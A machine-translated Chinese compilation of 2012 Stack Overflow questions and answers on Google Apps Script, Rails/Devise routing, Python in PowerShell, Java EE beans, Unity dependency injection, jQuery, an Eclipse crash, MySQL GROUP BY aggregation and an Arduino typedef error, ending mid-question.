[https://github.com/yoavmil/amlib](https://github.com/yoavmil/amlib) - 这是一个用于 3D 切片的工具集（适用于多边形，而不是光栅）。

我以写切片机为生。

# google-apps-script - 如何使用 DocsList 将文件复制到特定文件夹中？

> ID：13328247
> 
> 赞同：1
> 
> 时间：2012-11-11T03:06:15.650
> 
> 标签：google-apps-script

我正在尝试使用此代码将 Google 电子表格复制到特定文件夹中

```
var targetFolder = DocsList.createFolder("Testing");
var mainDocBlob = DocsList.getFileById("docId").getBlob();
var newMainDoc = targetFolder.createFile(mainDocBlob); 
```

但生成的文件是 Pdf 文件，而不是源文件中的电子表格。

如何使用 DocsList 正确执行此操作并始终获得与源相同类型的文件。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-27T03:55:57.663

DriveApp 服务于 2013 年 8 月 20 日更新，使用新方法[File.makeCopy(destination)](https://developers.google.com/apps-script/reference/drive/file#makeCopy%28Folder%29)和[File.makeCopy(name, destination)](https://developers.google.com/apps-script/reference/drive/file#makeCopy%28String,Folder%29)允许脚本指定应将文件复制到的文件夹。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-11T09:29:30.973

正如[其他帖子回答](https://stackoverflow.com/questions/13259041/creating-a-zip-file-inside-google-drive-with-apps-script)中提到的那样，谷歌文档不是常识中的“文件”，没有必要使用 getBlob 来复制它们，因为它们实际上没有 Blob ...（而且它们实际上没有出于同样的原因，“大小”也不使用 Gdrive 中的空间！）

相反，您应该使用（如大卫的回答中所述）`addToFolder()`。

从此时起，您的文件将被移动到相应的文件夹中。如果您需要在您的根文件夹中有一个副本，然后制作一个副本，但取决于您访问文件的方式，这并不总是必要的，因为您始终可以使用“所有项目”浏览您的 Google 驱动器，您可以在其中看到所有项目相应的文件夹（以及它们所属的文件夹的名称）。

如果该文件已经在一个文件夹中，那么它将显示为属于这两个文件夹，您可以再次选择保持原样或使用 将其从原始文件夹中删除`removeFromFolder()`。

我知道这与其他答案似乎有点多余，但我只是希望它能让谷歌驱动器的组织更加清晰。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T03:55:40.267

我建议使用 *文件*makeCopy() 创建副本；addToFolder() 将其放入目标文件夹；和 removeFromFolder()

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-11T09:04:45.043

下面是应该工作的代码。我猜你什么时候得到一个 blob it.s 默认将新文件转换为 pdf。在下面的代码中，makeCopy 默认将新文件名设为“...的副本”，但这可以[通过字符串设置](https://developers.google.com/apps-script/class_file#makeCopy)。

```
var targetFolder = DocsList.createFolder("Testing");
var mainDoc = DocsList.getFileById("docId");
mainDoc.makeCopy().addToFolder(targetFolder); 
```

# ruby-on-rails-3 - 在根路径中显示登录页面

> ID：13328251
> 
> 赞同：0
> 
> 时间：2012-11-11T03:07:56.740
> 
> 标签：ruby-on-rails-3, devise, routes

在带有设计的 rails 3 项目中，如何将登录页面 /users/sign_in 放在根路径中。

我尝试`routes.rb`put `root :to => "users#sign_in"`或`root :to => "sessions#sign_in"`，但不工作，或其他方式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:17:02.163

配置你`routes.rb`的：

```
 devise_scope :user do
    get "/", :to => "devise/sessions#new"
  end 
```

# python - Powershell Python：使用的更改版本

> ID：13328258
> 
> 赞同：5
> 
> 时间：2012-11-11T03:10:23.723
> 
> 标签：python, powershell

我用的是windows xp。

我正在尝试在 powershell 中使用 Python。在我的电脑上，我安装了 Python 3.3 和 2.7。我正在尝试运行 2.7，但是每当我在 powershell 中键入“python”时，它都会打开 3.3。

如何选择要运行的 Python 版本？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-11T04:57:14.223

在 powershell 中，输入以下内容：

```
$Env:PY_PYTHON = 2 
```

然后尝试使用命令“py”。它应该启动 Python 2.7。如果你想再次运行 Python 3.3，“py -3”就可以了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T04:23:11.100

像 Python Select 这样的东西？Windows 支持是实验性的，但可能值得一试。

[https://github.com/Activestate/pythonselect](https://github.com/Activestate/pythonselect)

还有 switchpy，虽然它只支持 Python 3.2。

apipes.blogspot.com/2010/10/switchpy.html?m=1

# jakarta-ee - 有状态会话 bean 和在 SessionScoped ManagedBean 中链接的 POJO 之间的区别

> ID：13328265
> 
> 赞同：0
> 
> 时间：2012-11-11T03:14:05.323
> 
> 标签：jakarta-ee, pojo, managed-bean, stateful-session-bean

我对 Java EE 很陌生，我问自己以下问题：

持有指向有状态会话 bean 的链接和持有指向 SessionScoped 托管 bean 中的 POJO 的链接有什么区别？

由于 ManagedBean 是会话范围的，因此它在会话期间保留。因此，我想我仍然可以在会话期间访问一个简单的 POJO。对？

那么 SFSB 的真正目的是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:12:33.883

SFSB 是一个 EJB，因此支持容器管理事务、@Asynchronous 方法调用以及 @Schedule 和 @Timeout 等内容。

托管 Bean 可以访问 FacesContext 和 HttpContext 等内容。

因此，根据您的需要，SFSB 可能不会添加您需要的任何内容。例如，我已经编写了几百个 SLSB，但还没有创建我的第一个 SFSB，因为我让用户会话存在于 ManagedBeans 中并且让 ejb 层对用户会话不敏感。

看：[sessionscoped managed bean vs stateful ejb](https://stackoverflow.com/questions/4842066/sessionscoped-managed-bean-vs-stateful-ejb)

# c# - 在解析服务时，如何指定 Unity 使用的构造函数？

> ID：13328266
> 
> 赞同：2
> 
> 时间：2012-11-11T03:14:38.270
> 
> 标签：c#, .net, inversion-of-control, unity-container, constructor-injection

我有以下构造函数：

```
public ReferenceService(
    IAzureTable<Reference> referenceRepository)
{
    _referenceRepository = referenceRepository;
}

public ReferenceService(CloudStorageAccount devStorageAccount)
{
    _referenceRepository = new AzureTable<Reference>(devStorageAccount, "TestReferences");
} 
```

在 Bootstrapper.cs 中

```
CloudStorageAccount storageAccount;
        storageAccount = CloudStorageAccount.FromConfigurationSetting("DataConnectionString");
        var container = new UnityContainer();
        container.RegisterType<IReferenceService, ReferenceService>(); 
```

当我尝试让 Unity 解析我的服务时，它会给我一条错误消息，指出有多个构造函数具有一个参数：

```
[ResolutionFailedException: Resolution of the dependency failed, type = "WebUx.xController", name = "(none)".
Exception occurred while: while resolving.
Exception is: InvalidOperationException - The type ReferenceService has multiple constructors of length 1\. Unable to disambiguate.
-----------------------------------------------
At the time of the exception, the container was:

  Resolving WebUx.xController,(none)
  Resolving parameter "referenceService" of constructor WebUx.xController(
Storage.Services.IContentService contentService,  
Storage.Services.IReferenceService referenceService
)
    Resolving Storage.Services.ReferenceService,(none) (mapped from Storage.Services.IReferenceService, (none))
] 
```

有没有办法强制 Unity 使用我的两个构造函数之一？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T03:29:38.243

[一种方法是使用InjectionConstructorAttribute](http://msdn.microsoft.com/en-us/library/ff650802.aspx)注释您想要的构造函数：

> 当一个目标类包含多个具有相同参数数量的构造函数时，必须将 InjectionConstructor 属性应用于构造函数

样本：

```
[InjectionConstructor]
public ReferenceService(IAzureTable<Reference> referenceRepository)
{
    _referenceRepository = referenceRepository;
}

public ReferenceService(CloudStorageAccount devStorageAccount)
{
    _referenceRepository = new AzureTable<Reference>(devStorageAccount, "TestReferences");
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:27:56.717

试试[InjectionConstructor](http://msdn.microsoft.com/en-us/library/microsoft.practices.unity.injectionconstructor.injectionconstructor.aspx)。

```
container.RegisterType<IReferenceService, ReferenceService>(); 
```

更改为

```
container.RegisterType<IReferenceService, ReferenceService>(new InjectionConstructor()); 
```

如果你想使用没有参数的那个。

# email - PEAR Mail 无法连接到 gmail，引发错误

> ID：13328270
> 
> 赞同：0
> 
> 时间：2012-11-11T03:15:25.933
> 
> 标签：email, gmail, pear, bluehost, general-network-error

解决了。Bluehost 阻塞了端口，他们不会解除阻塞。希望这对其他人有帮助。

* * *

我正在使用此代码示例中给出的 PEAR 邮件脚本： [Send email using the GMail SMTP server from a PHP page](https://stackoverflow.com/questions/712392/send-email-using-gmail-smtp-server-from-php-page)

我在 Bluehost 上，当我尝试连接到 Gmail 时，出现以下错误：

> 无法连接到 ssl://smtp.gmail.com:465 [SMTP：连接套接字失败：网络无法访问（代码：-1，响应：）]

我能做些什么来进一步调试/跟踪这个？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T06:37:37.687

主机阻塞了端口。

# java - Java - 在构造函数中将对象作为参数传递......来自超类

> ID：13328271
> 
> 赞同：1
> 
> 时间：2012-11-11T03:16:03.587
> 
> 标签：java, inheritance, constructor, subclass, superclass

我有这些类：一个名为“Shape”的抽象类，一个类 Point 扩展了 Shape，一个类 Circle 扩展了 Point

我无法改变这种关系。我需要做的是在 Circle 中创建一个构造函数，它接收一个对象 Point 和一个 double 作为参数。我已经创建了一个对象点，称为点我已经尝试过：

```
public Circle (Point objPunto, double valorRadio){   
  Pointp = new Point(objPunto.getX(), objPunto.getY());
  setRadio(valorRadio);} 
```

和

```
Circulo circulo2 = new Circulo(point, 3); 
```

但它似乎不起作用。它向我展示了这个： `Implicit super constructor Punto() is undefined. Must explicitly invoke another constructor`。

我还使用 Super 尝试了一些奇怪的事情，但这也不起作用。我开始认为它可以做到，如果是这样......谁知道为什么？

谢谢！

点代码

```
 public class Point extends Shape {

   private int x;  
   private int y;  

   public Point( int valorX, int valorY ){
      x = valorX;  
      y = valorY;  
   } 

   public void setX( int valorX ){
      x = valorX;  
   } 

   public int getX(){
      return x;
   } 

   public void setY( int valorY ){
      y = valorY;  
   } 

   public int getY(){
      return y;
   } 

   public String getName(){
      return "Punto";
   } 

   public String describe(){
      return "[" + obtenerX() + ", " + obtenerY() + "]";
   } 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:26:40.870

您的圈子正试图调用`super();`它的第一步，但`Point`没有默认的无参数构造函数。您必须调用将参数作为 Circle 构造函数的第一行的 super 方法。

尝试`super(objPunto.getX(), objPunto.getY());`作为 Circle 构造函数中的第一个调用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:27:05.797

我认为您可以调用`super()`前两个参数，如下所示：

```
 public Circle (Point objPunto, double valorRadio){   
      super(objPunto.getX(), objPunto.getY());
      setRadio(valorRadio);
    } 
```

`super()`调用 的构造`parent class`函数，如果使用，它应该是子构造函数中的第一条语句。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T03:24:19.383

如果您的类`Circle`extends `Point`，那么它可以访问它的成员。无需创建`new Point()`：

```
public Circle (Point objPunto, double valorRadio){   
  setX(objPunto.getX());
  setY(objPunto.getY());
  setRadio(valorRadio);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T03:29:30.303

有了你刚刚提供的信息，你应该做这样的事情

```
public Circle (Point objPunto, double valorRadio) {
    super.(objPunto.getX(), objPunto.getY());
} 
```

不过，请确保您了解何时调用超类的构造函数。请记住，当您扩展时，它仍然会创建超类，这意味着如果它们需要创建自己的任何信息，那么您需要调用 super。重要的是要注意 super**必须**是你调用的第一件事。

# android - 在移动浏览器上打开软键盘时如何防止页面跳转？

> ID：13328273
> 
> 赞同：0
> 
> 时间：2012-11-11T03:16:22.010
> 
> 标签：android, jquery, web-applications, mobile-browser

我正在研究移动网络应用程序。在移动浏览器上打开软键盘时如何防止页面跳转？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T06:25:33.293

我想[这](https://stackoverflow.com/a/6111867/969325)就是答案。简而言之，添加`android:windowSoftInputMode="adjustPan"`到您的活动选项卡中。

但是，如果您所说的 webapp 是指不使用任何本机代码的应用程序，我不知道 :)

# jquery - 如何使我的插件选项可用于所有插件？

> ID：13328274
> 
> 赞同：0
> 
> 时间：2012-11-11T03:16:55.660
> 
> 标签：jquery, jquery-plugins, plugins

我开始制作插件，但插件内部的变量范围有问题。我希望能够从插件内的任何地方访问我的选项，但不确定如何，var $opts 仅对该函数可见，而我的公共函数无法访问它。有谁知道我会怎么做？

在此先感谢，哦，如果有人注意到我制作插件的方式有任何错误，请毫不犹豫地提及它们：D

```
//@@@@ Start of myViewport Plugin @@@@\\
(function($) {

  $.fn.myViewport = function(options) {
    var $opts = $.extend({}, $.fn.myViewport.defaults, options);

    //Plugin Here
    return this.each(function() {           

        alert('Initialising Plugin!' + $opts.privateText + $opts.publicText);
        myPrivateFunction();
    });
  };

  // private functions
  function myPrivateFunction($opts) {
        alert($opts.privateText);
  };

  // public functions
  $.fn.myViewport.myPublicFunction = function() {
        alert($opts.publicText);
  };

  // plugin defaults
  $.fn.myViewport.defaults = {
    privateText: 'This is a text from the privateText defaults',
    publicText: 'This is a text from the publicText defaults'
  };

})(jQuery);
//@@@@ End of myViewport Plugin @@@@\\ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:28:33.700

像这样 ：

```
(function($) {

  $.fn.myViewport = function(options) {
    var o = $.extend(vp, $.fn.myViewport.defaults, options);

    //Plugin Here
    return this.each(function() {           

        alert('Initialising Plugin!' + o.privateText + o.publicText);
        myPrivateFunction();
    });
  };

  var vp = $.fn.myViewport;

  // private functions
  function myPrivateFunction() {
        alert(vp.privateText);
  };

  // public functions
  vp.myPublicFunction = function() {
        alert(vp.defaults.publicText);
  };

  // plugin defaults
  vp.defaults = {
    privateText: 'This is a text from the privateText defaults',
    publicText: 'This is a text from the publicText defaults'
  };

})(jQuery); 
```

**演示[在这里](http://jsfiddle.net/NzBAe/1/)。**

# c++ - Eclipse (C/C++) 错误：平台关闭后发现作业仍在运行

> ID：13328278
> 
> 赞同：31
> 
> 时间：2012-11-11T03:17:31.137
> 
> 标签：c++, c, eclipse, eclipse-juno

当我打开 Eclipse 时，它​​在一个小时前工作，它在启动时冻结并给出错误：“发生错误。查看日志文件”。请参阅下面的日志文件。

虽然其中一些信息出现在日志中，

操作系统：Mac OSX 10.7.5

Eclipse：面向 C/C++ 开发人员的 Eclipse IDE 3.8

此外，我尝试使用 -clean 启动 Eclipse 可执行文件，以及删除 .metadata 文件夹中的各种文件。互联网上有很多解决方案，到目前为止都没有奏效。

```
!SESSION 2012-11-10 22:10:32.651 -----------------------------------------------
eclipse.buildId=M20120914-1800
java.version=1.7.0_09
java.vendor=Oracle Corporation
BootLoader constants: OS=macosx, ARCH=x86_64, WS=cocoa, NL=en_US
Framework arguments:  -product org.eclipse.epp.package.cpp.product -keyring /Users/Puzzel/.eclipse_keyring -showlocation
Command-line arguments:  -os macosx -ws cocoa -arch x86_64 -product org.eclipse.epp.package.cpp.product -keyring /Users/Puzzel/.eclipse_keyring -showlocation

!ENTRY org.eclipse.core.net 1 0 2012-11-10 22:10:35.937
!MESSAGE System property http.nonProxyHosts has been set to local|*.local|169.254/16|*.169.254/16 by an external source. This value will be overwritten using the values from the preferences

!ENTRY org.eclipse.osgi 4 0 2012-11-10 22:10:36.479
!MESSAGE Application error
!STACK 1
org.eclipse.swt.SWTException: Failed to execute runnable (java.lang.NullPointerException)
    at org.eclipse.swt.SWT.error(SWT.java:4361)
    at org.eclipse.swt.SWT.error(SWT.java:4276)
    at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:138)
    at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3944)
    at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3621)
    at org.eclipse.swt.widgets.Display.release(Display.java:3682)
    at org.eclipse.swt.graphics.Device.dispose(Device.java:190)
    at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:140)
    at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:353)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:180)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:629)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:584)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1438)
Caused by: java.lang.NullPointerException
    at org.eclipse.ui.internal.Workbench.createWorkbenchWindow(Workbench.java:1231)
    at org.eclipse.ui.internal.Workbench.getActiveWorkbenchWindow(Workbench.java:1224)
    at org.eclipse.cdt.codan.internal.ui.cxx.Startup$1.run(Startup.java:39)
    at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35)
    at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:135)
    ... 17 more

!ENTRY org.eclipse.mylyn.monitor.ui 4 0 2012-11-10 22:10:36.569
!MESSAGE Monitor UI stop failed
!STACK 0
java.lang.NullPointerException
    at org.eclipse.mylyn.internal.monitor.ui.ActivityContextManager.stop(ActivityContextManager.java:152)
    at org.eclipse.mylyn.internal.monitor.ui.MonitorUiPlugin.stop(MonitorUiPlugin.java:157)
    at org.eclipse.osgi.framework.internal.core.BundleContextImpl$2.run(BundleContextImpl.java:771)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.eclipse.osgi.framework.internal.core.BundleContextImpl.stop(BundleContextImpl.java:764)
    at org.eclipse.osgi.framework.internal.core.BundleHost.stopWorker(BundleHost.java:510)
    at org.eclipse.osgi.framework.internal.core.AbstractBundle.suspend(AbstractBundle.java:566)
    at org.eclipse.osgi.framework.internal.core.Framework.suspendBundle(Framework.java:1206)
    at org.eclipse.osgi.framework.internal.core.StartLevelManager.decFWSL(StartLevelManager.java:592)
    at org.eclipse.osgi.framework.internal.core.StartLevelManager.doSetStartLevel(StartLevelManager.java:257)
    at org.eclipse.osgi.framework.internal.core.StartLevelManager.shutdown(StartLevelManager.java:215)
    at org.eclipse.osgi.framework.internal.core.InternalSystemBundle.suspend(InternalSystemBundle.java:284)
    at org.eclipse.osgi.framework.internal.core.Framework.shutdown(Framework.java:692)
    at org.eclipse.osgi.framework.internal.core.Framework.close(Framework.java:600)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.shutdown(EclipseStarter.java:399)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:199)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:629)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:584)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1438)

!ENTRY org.eclipse.core.jobs 2 2 2012-11-10 22:10:36.917
!MESSAGE Job found still running after platform shutdown.  Jobs should be canceled by the plugin that scheduled them during shutdown: org.eclipse.mylyn.internal.tasks.ui.TasksUiPlugin$TasksUiInitializationJob

!ENTRY org.eclipse.core.jobs 2 2 2012-11-10 22:10:36.918
!MESSAGE Job found still running after platform shutdown.  Jobs should be canceled by the plugin that scheduled them during shutdown: org.eclipse.epp.internal.mpc.ui.wizards.MarketplaceDropAdapter$1 
```

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2012-11-11T04:26:46.717

删除`workspace/.metadata/.plugins/org.eclipse.e4.workbench/workbench.xmi`解决了问题。

看到这个[答案](https://stackoverflow.com/a/12045547/1580190)。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2017-03-19T13:46:40.920

通过使用 -clearPersistedState 为我工作的选项从 CLI 打开也解决了问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-24T08:12:59.157

如果您在使用 Flash Builder 时遇到同样的问题，请删除：

```
.metadata\.plugins\org.eclipse.ui.workbench\workbench.xml 
```

# mysql - mysql INNER JOIN 不像我想的那样工作

> ID：13328279
> 
> 赞同：0
> 
> 时间：2012-11-11T03:18:25.667
> 
> 标签：mysql

有两张桌子：

```
CREATE  TABLE IF NOT EXISTS `issue_details` (
    `id` INT NOT NULL AUTO_INCREMENT ,
    amt_offer_dlr INT NOT NULL DEFAULT 9999 COMMENT '564,510,000',
   maturity  DATE NOT NULL DEFAULT '1111-11-11' COMMENT '06/28/2012' ,
    fk_cusip6 VARCHAR(6) NOT NULL DEFAULT '' COMMENT '' ,
  PRIMARY KEY (id),
  CONSTRAINT con_issue_details__issuers FOREIGN KEY (fk_cusip6) REFERENCES issuers    (fk_cusip6) ON DELETE NO ACTION ON UPDATE CASCADE
)
ENGINE = InnoDB;

CREATE  TABLE IF NOT EXISTS `identifiers` (
  id     INT NOT NULL AUTO_INCREMENT ,
  fk_cusip6 VARCHAR(6)  NOT NULL DEFAULT 'NA' ,
  PRIMARY KEY (id) ,
  CONSTRAINT con_ident__cusip6  FOREIGN KEY (fk_cusip6) REFERENCES cusip_6 (cusip6) ON DELETE NO ACTION ON UPDATE CASCADE ,
)
COMMENT ''
 ENGINE = InnoDB; 
```

issue_details 表：注意：每个 id 不同可以有多个相同的 fk_cusip6 数字

```
+-----+--------------+------------+----------------+
| id  | maturity     | fk_cusip6  |  amt_offer_dlr |
+-----+--------------+------------+----------------+
|  1  | 2013-06-28   | 567090     |  1000          |
|  2  | 2014-06-05   | 567090     |  1000          |
|  3  | 2013-06-05   | 567100     |  2500          |
|  3  | 2014-06-05   | 567100     |  2500          |
+-----+--------------+------------+----------------+ 
```

标识符表：注意：每个 fk_cusip6 编号不同

```
+--------+-----------+
| id     | fk_cusip6 |
+--------+-----------+
| 131472 | 567090    |
| 131473 | 567100    |
+--------+-----------+ 
```

我需要生成一个查询，该查询将匹配标识符表中 fk_cusip6 的每个实例，然后对 issue_details 表中具有相同 fk_cusip6 的所有实例求和 amt_offer_dlr。最终结果应该是：

```
+--------------+---------+------------------------+
| ide.id | isd.fk_cusip6 |  SUM(isd.Amt_Offer_Dlr |
+--------------+---------+------------------------+
| 131472 | 567090        | 2000                   |
| 131473 | 567100        | 5000                   |
+--------------+---------+------------------------+ 
```

我试过：

```
SELECT CURRENT_DATE, FORMAT(SUM(isd.Amt_Offer_Dlr),0) 'Current Out Standing Debt:'
from muni.issue_details isd
INNER JOIN identifiers ide ON ide.fk_cusip6 = isd.fk_cusip6 AND  isd.fk_cusip6 = '567541'
where isd.maturity > CURRENT_DATE
; 
```

这是对所有列的总和。

我想我需要一个子查询，但我坚持细节。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:21:58.630

试试这个：

```
SELECT
    i.id,
    i.fk_cusip6,
    x.amt_offer_dlr_sum

FROM identifiers i

INNER JOIN (
    SELECT
        id.fk_cusip6,
        SUM(id.amt_offer_dlr) AS amt_offer_dlr_sum
    FROM issue_details id
    GROUP BY id.fk_cusip6
) x
ON x.fk_cusip6 = i.fk_cusip6; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:46:52.997

将 SQL 中的查询过程视为一个三阶段活动。这可能无法捕捉到实际发生的所有丰富性，但在您的情况下它在逻辑上是准确的。

让我们简化查询以删除日期/成熟度检查并检查单个 fk_cusip6 值，因此它只是：

```
SELECT SUM(isd.Amt_Offer_Dlr) 
FROM muni.issue_details isd
INNER JOIN identifiers ide ON ide.fk_cusip6 = isd.fk_cusip6 
```

第一阶段是表的连接，以生成要考虑的所有行的列表。因此，在上面的简化示例中，我们正在查看 issue_details 和 fk_cusip6 上匹配的标识符之间的连接。此阶段生成一个包含四行的列表（每个 issue_details 行一个，并附加相应的标识符行）。

这给了你一个这样的结构：

```
+-----+--------------+------------+----------------+---------+----------------+
| id  | maturity     | fk_cusip6  |  amt_offer_dlr | ide.id  | ide.fk_cusip6  |
+-----+--------------+------------+----------------+---------+----------------+
|  1  | 2013-06-28   | 567090     |  1000          |  131472 |  567090        |
|  2  | 2014-06-05   | 567090     |  1000          |  131472 |  567090        |
|  3  | 2013-06-05   | 567100     |  2500          |  131473 |  567100        |
|  3  | 2014-06-05   | 567100     |  2500          |  131473 |  567100        |
+-----+--------------+------------+----------------+---------+----------------+ 
```

现在，一个像这样的非聚合 SQL 语句：

```
SELECT *
FROM muni.issue_details isd
INNER JOIN identifiers ide ON ide.fk_cusip6 = isd.fk_cusip6 
```

只会返回那张桌子。但是你有一个与 SUM() 的聚合，所以我们进入第二阶段。

第二阶段确定哪些行应该被存储在一起以执行聚合。我说的是分桶，但在 SQL 术语中，我们会说哪些行被分组在一起，这意味着可能使用 GROUP BY 子句。但是，在我们的查询中，没有 GROUP BY 子句，因此查询处理器必须选择将所有行分组到一个存储桶中。这不是您想要的，但没有任何关于如何对行进行分组的说明，这是处理器必须做的。因此，您的聚合将对所有四行执行一次聚合。

第三阶段是实际的聚合本身。这是我们总结所有四行结果的地方。在上面的示例查询中，我们只会看到 1000+1000+2500+2500 或 7000 的输出。同样，这不是您想要的。

现在考虑这个替代查询：

```
SELECT ide.id, isd.fk_cusip6, SUM(isd.Amt_Offer_Dlr) 
FROM muni.issue_details isd
INNER JOIN identifiers ide ON ide.fk_cusip6 = isd.fk_cusip6
GROUP BY ide.id, isd.fk_cusip6 
```

此查询的第一阶段与之前相同；作为内部连接的结果，生成了四行。

但是，在第二阶段，现在我们有一个 GROUP BY，因此查询处理器会将第一阶段的行分桶到每个 identifiers.id 值的单独桶中。所以我们得到这样的东西：

+--------+-----+--------------+------------+------- ---------+---------+-----------------+ |桶 | 编号 | 成熟度 | fk_cusip6 | amt_offer_dlr | ide.id | iden.fk_cusip6 | |--------+-----+--------------+------------+------- ---------+---------+-----------------+ | 一个 | 1 | 2013-06-28 | 567090 | 1000 | 131472 | 567090 | | 一个 | 2 | 2014-06-05 | 567090 | 1000 | 131472 | 567090 | |--------+-----+--------------+------------+------- ---------+---------+-----------------+ | 乙| 3 | 2013-06-05 | 567100 | 2500 | 131473 | 567100 | | 乙| 3 | 2014-06-05 | 567100 | 2500 | 131473 | 567100 | +--------+-----+--------------+------------+------- ---------+---------+------------------+

（对不起，我不知道如何格式化这么宽的表格）

Bucket A 是 identifiers.id=131472 的所有行，bucket B 是 identifiers.id=131473 的所有行。

第三阶段为每个存储桶执行聚合，为您提供所需的结果：

```
+--------------+---------+------------------------+
| ide.id | isd.fk_cusip6 |  SUM(isd.Amt_Offer_Dlr |
+--------------+---------+------------------------+
| 131472 | 567090        | 2000                   |
| 131473 | 567100        | 5000                   |
+--------------+---------+------------------------+ 
```

只要您要应用的其他搜索条件简单明了，我认为您不需要子查询。但即便如此，如果条件变得更复杂，您必须弄清楚它们是否进入子查询、连接子句或整个 WHERE 子句本身，这可能会导致混淆。我尽量保持选择尽可能简单。

# php - 在点击的地方插入img

> ID：13328280
> 
> 赞同：2
> 
> 时间：2012-11-11T03:18:35.067
> 
> 标签：php, jquery, css

如何在我点击页面的任何位置插入 img？

我有以下代码：

```
$(document).click(function(e){
    var x = e.pageX;
    var y = e.pageY;
    var string = x +','+ y;
    //alert(string);
    $('.marker').css(
        {
            'left': x +'px',
            'top': y +'px'
        },{
              duration:1000,
          })        
}); 
```

但这只会在页面周围移动 img。我需要添加多个副本并 POST 到 php url。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T03:28:39.260

[克隆](http://api.jquery.com/clone/)元素。

```
$(document).click(function(e) {
    var x = e.pageX;
    var y = e.pageY;
    var string = x + ',' + y;
    //alert(string);
    $('.marker:first').clone().css({
        'left': x + 'px',
        'top': y + 'px'
    }).appendTo('body')
}) 
```

[http://jsfiddle.net/xarGV/](http://jsfiddle.net/xarGV/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:30:01.347

你是这个意思 ？

```
$(document).click(function(e){
    var x = e.pageX;
    var y = e.pageY;
    var string = x +','+ y;
    //alert(string);
    $('.marker:first').clone().css({
        'left': x +'px',                                        
        'top': y +'px',
        'position':'absolute'
    }).appendTo('body')      
}); 
```

[**演示**](http://jsfiddle.net/heera/Avh6V/4/)。

# arduino - typedef 声明中缺少类型名

> ID：13328282
> 
> 赞同：2
> 
> 时间：2012-11-11T03:19:00.437
> 
> 标签：arduino

嗨，有一个错误提示：每当我将代码上传到 Arduino atmega 时，typedef-declaration 中缺少类型名称。

```
typedef union DrsData
{
unsigned char   ucData[MAX_PACKET_SIZE-MIN_PACKET_SIZE];

 DrsRWData      stRWData;
 DrsIJogData        stIJogData;
 DrsSJogData        stSJogData; <-the error is highlighted at this line
}DrsData; 
```

我可以知道这段代码有什么问题吗？谢谢！

这是包含标题的源代码。

```
#include<Arduino.h>
#include<Wire.h>
#include<Math.h> 
#include <SoftwareSerial.h>//
#define rxPin 19   // Defines the "recieve" pin for software serial to motor `enter code here`controller
#define txPin 18    // Defines the "transmit" pin for software serial to motor controller

    //CPU
    #define F_CPU 16000000

//ATmega128? ???? ?? ???? ??
#include <avr/io.h>
//interrupt? ???? ? ??? ???? ???? ??
#include <avr/interrupt.h>
//_delay_ms ? ??? ??? ???? ??
#include <util/delay.h>

#include<inttypes.h> 

#define PROTOCOL_SIZE_IDX 2
#define PROTOCOL_ID_IDX   3
#define PROTOCOL_CMD_IDX  4
#define PROTOCOL_CS1_IDX  5
#define PROTOCOL_CS2_IDX  6
#define PROTOCOL_DATA_IDX  7

#define HEADER      0xFF

//SIZE
